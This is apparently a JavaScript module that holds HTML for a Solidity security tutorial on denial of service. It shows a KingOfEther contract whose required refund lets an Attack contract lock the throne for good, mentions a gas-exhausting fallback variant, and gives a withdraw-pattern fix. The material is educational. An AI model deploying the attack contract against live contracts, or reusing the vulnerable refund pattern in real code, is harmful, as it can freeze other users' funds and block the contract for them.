// metadata
export const version = "0.6.10"
export const title = "Denail of Service"
export const description = "An example of denial of service hack in Solidity"

const html = `<h3 id="vulnerability">Vulnerability</h3>
<p>There are many ways to attack a smart contract to make it unusable.</p>
<p>One exploit we introduce here is denial of service by making the function to send Ether fail.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.0;</span>
<span class="hljs-comment">/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/</span>

<span class="hljs-comment">/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">KingOfEther</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> king;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimThrone</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt; balance, <span class="hljs-string">"Need to pay more to become the king"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) = king.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> balance}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balance = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        king = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    KingOfEther kingOfEther;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">KingOfEther _kingOfEther</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        kingOfEther = KingOfEther(_kingOfEther);
    }

    <span class="hljs-comment">// You can also perform a DOS by consuming all gas using assert.</span>
    <span class="hljs-comment">// This attack wil work even if the calling contract does not check</span>
    <span class="hljs-comment">// whether the call was successful or not.</span>
    <span class="hljs-comment">//</span>
    <span class="hljs-comment">// function () external payable {</span>
    <span class="hljs-comment">//     assert(false);</span>
    <span class="hljs-comment">// }</span>

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        kingOfEther.claimThrone{<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}();
    }
}</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<p>One way to prevent this is to allow the users to withdraw their Ether instead of sending it.</p>
<p>Here is a example.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.0;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">KingOfEther</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> king;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimThrone</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt; balance, <span class="hljs-string">"Need to pay more to become the king"</span>);

        balances[king] += balance;

        balance = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        king = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> != king, <span class="hljs-string">"Current king cannot withdraw"</span>);

        <span class="hljs-keyword">uint</span> amount = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;

        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}
</code></pre>
`

export default html
